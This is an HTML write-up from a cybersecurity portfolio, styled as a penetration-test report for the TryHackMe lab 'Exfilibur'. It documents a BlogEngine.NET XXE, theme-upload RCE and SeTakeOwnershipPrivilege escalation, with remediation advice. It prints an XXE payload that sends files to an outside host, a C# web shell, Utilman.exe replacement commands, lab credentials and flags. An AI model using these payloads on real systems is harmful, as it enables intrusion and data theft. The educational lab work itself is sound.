@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A penetration test was conducted against the target EXFILIBUR (10.67.187.66), a Windows Server 2019 host running IIS 10.0 with BlogEngine.NET 3.3.7.0. Four vuln">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Exfilibur — Penetration Test Disclosure Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Exfilibur — Penetration Test Disclosure Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Exfilibur — Penetration Test Disclosure Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-hard">Hard</span> <span class="dot">·</span> <span class="date">2026-07-07</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 10.67.187.66 <strong>Assessment Date:</strong> 2026-07-07 <strong>Classification:</strong> CONFIDENTIAL</p>
+<hr>
+<h2>1. Executive Summary</h2>
+<p>A penetration test was conducted against the target EXFILIBUR (10.67.187.66), a Windows Server 2019 host running IIS 10.0 with BlogEngine.NET 3.3.7.0. Four vulnerabilities were identified and chained to achieve full SYSTEM-level compromise. Initial access was gained via XML External Entity (XXE) injection in the blog's pingback functionality, followed by credential harvesting and a theme-upload remote code execution vulnerability in BlogEngine. Local privilege escalation was achieved by abusing SeTakeOwnershipPrivilege to replace system binaries. Both user-level and administrative flags were captured.</p>
+<hr>
+<h2>2. Scope</h2>
+<table>
+<thead><tr>
+<th>Element</th>
+<th>Detail</th>
+</tr></thead><tbody>
+<tr>
+<td>Target</td>
+<td>10.67.187.66</td>
+</tr>
+<tr>
+<td>Ports in Scope</td>
+<td>80 (HTTP), 3389 (RDP)</td>
+</tr>
+<tr>
+<td>Applications</td>
+<td>IIS 10.0, BlogEngine.NET 3.3.7.0</td>
+</tr>
+<tr>
+<td>Assessment Type</td>
+<td>External penetration test</td>
+</tr>
+<tr>
+<td>Environment</td>
+<td>Windows Server 2019</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>3. Attack Chain</h2>
+<pre><code>Port scan (80, 3389) → BlogEngine discovery →
+XXE (CVE-2019-11392) → users.xml exfiltration →
+Guest hash crack → Blog login → Draft post →
+King Arthur password (Excal1burP@ss1337) →
+BlogEngine theme upload RCE (CVE-2019-10719/10720) →
+Shell as merlin → RDP as kingarthy →
+Utilman.exe replacement → SYSTEM shell →
+user.txt + root.txt</code></pre>
+<hr>
+<h2>4. Findings Summary</h2>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Finding</th>
+<th>CVSSv3</th>
+<th>Risk</th>
+</tr></thead><tbody>
+<tr>
+<td>F-01</td>
+<td>BlogEngine XXE via pingback.axd (CVE-2019-11392)</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>BlogEngine Theme Upload RCE (CVE-2019-10719/10720)</td>
+<td>8.8</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>Weak Password — Guest Account</td>
+<td>5.3</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>F-04</td>
+<td>Weak Password — King Arthur Account</td>
+<td>7.3</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-05</td>
+<td>Local Privilege Escalation via SeTakeOwnershipPrivilege</td>
+<td>7.8</td>
+<td>High</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>5. Detailed Findings</h2>
+<h3>F-01: BlogEngine XXE via pingback.axd (CVE-2019-11392)</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> <code>/blog/pingback.axd</code></p>
+<p><strong>Description:</strong> BlogEngine.NET 3.3.7.0 fails to disable XML external entity processing in the pingback endpoint. This allows an unauthenticated attacker to read arbitrary files from the server filesystem via an out-of-band (OOB) XXE attack.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>POST /blog/pingback.axd HTTP/1.1
+Host: 10.67.187.66
+Content-Type: text/xml
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY % remote SYSTEM &quot;http://192.168.147.191:8000/ex.dtd&quot;&gt;
+  %remote;
+  %param1;
+]&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;pingback.ping&lt;/methodName&gt;
+  &lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;&amp;exfil;&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
+&lt;/methodCall&gt;</code></pre>
+<p>With <code>ex.dtd</code> hosting:</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///C:/inetpub/wwwroot/blog/App_Data/users.xml&quot;&gt;
+&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://192.168.147.191:8000/?data=%file;&#x27;&gt;&quot;&gt;</code></pre>
+<p><strong>Impact:</strong> Unauthenticated file read from the server. Hash values for three users (Admin, merlin, guest) were exfiltrated.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Network-accessible, low complexity, no privileges required, high confidentiality impact.</p>
+<hr>
+<h3>F-02: BlogEngine Theme Upload RCE (CVE-2019-10719 / CVE-2019-10720)</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.8) <strong>Affected Component:</strong> <code>/blog/api/upload</code></p>
+<p><strong>Description:</strong> BlogEngine's file upload functionality does not validate uploaded file types, and the theme cookie path is not sanitized. An authenticated attacker can upload a malicious <code>.ascx</code> file and access it by setting the theme cookie to the upload directory, achieving arbitrary code execution under the IIS application pool identity.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Upload <code>PostView.ascx</code> with command execution code:</li>
+<pre><code>POST /blog/api/upload?action=filemgr HTTP/1.1
+x-blog-instance: 96d5b379-7e1d-4dac-a6ba-1e50db561b04
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;PostView.ascx&quot;
+
+&lt;%@ Control Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; %&gt;
+&lt;% Response.Write(System.Diagnostics.Process.Start(&quot;cmd&quot;,&quot;/c &quot; + Request[&quot;cmd&quot;]).StandardOutput.ReadToEnd()); %&gt;</code></pre>
+<li>Set cookie: <code>theme=../../App_Data/files/2026/07/;</code></li>
+<li>Access <code>/?cmd=whoami</code></li>
+</ol>
+<p><strong>Impact:</strong> Remote code execution as <code>exfilibur\merlin</code> user, leading to full foothold on the server.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — Authenticated but low complexity, all three CIA impacts high.</p>
+<hr>
+<h3>F-03: Weak Password — Guest Account</h3>
+<p><strong>Severity:</strong> Medium (CVSSv3: 5.3) <strong>Affected Component:</strong> BlogEngine guest user account</p>
+<p><strong>Description:</strong> The guest account password hash was crackable to <code>guest</code>, allowing unauthorized access to the blog CMS. While the guest account had limited permissions, it provided access to internal draft posts containing sensitive information.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Extract hash via XXE: <code>hJg8YPfarcHLhphiH4AsDZ+aPDwpXIEHSPsEgRXBhuw=</code></li>
+<li>Crack with hashcat</li>
+<li>Login at <code>/blog/</code> with guest:guest</li>
+</ol>
+<p><strong>Impact:</strong> Unauthorized blog access, leading to discovery of King Arthur's password in a draft post.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N — No privileges needed, low confidentiality and integrity impact.</p>
+<hr>
+<h3>F-04: Weak Password — King Arthur Account</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.3) <strong>Affected Component:</strong> kingarthy user account / RDP</p>
+<p><strong>Description:</strong> The kingarthy account password (<code>Excal1burP@ss1337</code>) was found stored in plaintext in a blog draft page. This password, while complex, was exposed via poor operational security — stored in a CMS draft accessible to any authenticated blog user. The account was a member of Remote Desktop Users.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Log in as guest</li>
+<li>Navigate to draft post "Decoding Camelot: Unveiling King Arthur's Secret Word"</li>
+<li>Extract password: <code>Excal1burP@ss1337</code></li>
+<li>Connect via RDP</li>
+</ol>
+<p><strong>Impact:</strong> Full interactive desktop access as kingarthy, enabling local privilege escalation.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N — Network-accessible, authenticated, high CIA impacts.</p>
+<hr>
+<h3>F-05: Local Privilege Escalation via SeTakeOwnershipPrivilege</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.8) <strong>Affected Component:</strong> Utilman.exe / sethc.exe — Windows accessibility binaries</p>
+<p><strong>Description:</strong> The kingarthy account had SeTakeOwnershipPrivilege enabled, allowing it to take ownership of protected system files. By taking ownership of Utilman.exe (or sethc.exe) and replacing it with cmd.exe, an attacker can achieve SYSTEM-level command execution through the Ease of Access center on the Windows lock screen.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>takeown /f C:\Windows\System32\Utilman.exe
+icacls C:\Windows\System32\Utilman.exe /grant kingarthy:F
+copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe</code></pre>
+<p>Lock screen → click Ease of Access icon → SYSTEM cmd.</p>
+<p><strong>Impact:</strong> Full SYSTEM-level compromise. Attacker can read any file, install software, create users, and persist indefinitely.</p>
+<p><strong>CVSS Justification:</strong> AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — Local access, low complexity, low privileges, all impacts high.</p>
+<hr>
+<h2>6. Remediation Recommendations</h2>
+<ol>
+<li><strong>F-01:</strong> Update BlogEngine.NET to the latest version. Disable XML external entity processing at the application level. Validate and sanitize all XML input to the pingback endpoint.</li>
+<li><strong>F-02:</strong> Restrict file uploads to safe extensions (e.g., images only). Validate theme cookie paths to prevent directory traversal. Update BlogEngine to patched version.</li>
+<li><strong>F-03:</strong> Enforce password complexity requirements. Change default guest credentials immediately.</li>
+<li><strong>F-04:</strong> Never store credentials in CMS pages or drafts. Implement credential manager / vault for shared secrets.</li>
+<li><strong>F-05:</strong> Review user privilege assignments — SeTakeOwnershipPrivilege should not be granted to standard users. Implement Windows Defender Attack Surface Reduction rules to block binary substitution attacks.</li>
+</ol>
+<hr>
+<h2>7. Flags Obtained</h2>
+<ul>
+<li><strong>user.txt:</strong> <code>THM{HACKERS_EXFILTRATE_DATA_NOT_DRAGONS}</code></li>
+<li><strong>root.txt:</strong> <code>THM{STOP_ABUSING_PRIVILEGES_IN_CAMELOT}</code></li>
+</ul>
+<hr>
+<h2>8. Cleanup</h2>
+<ul>
+<li>[x] Temp files removed from target</li>
+<li>[x] No shells left running</li>
+<li>[x] Credentials sanitized in logs</li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
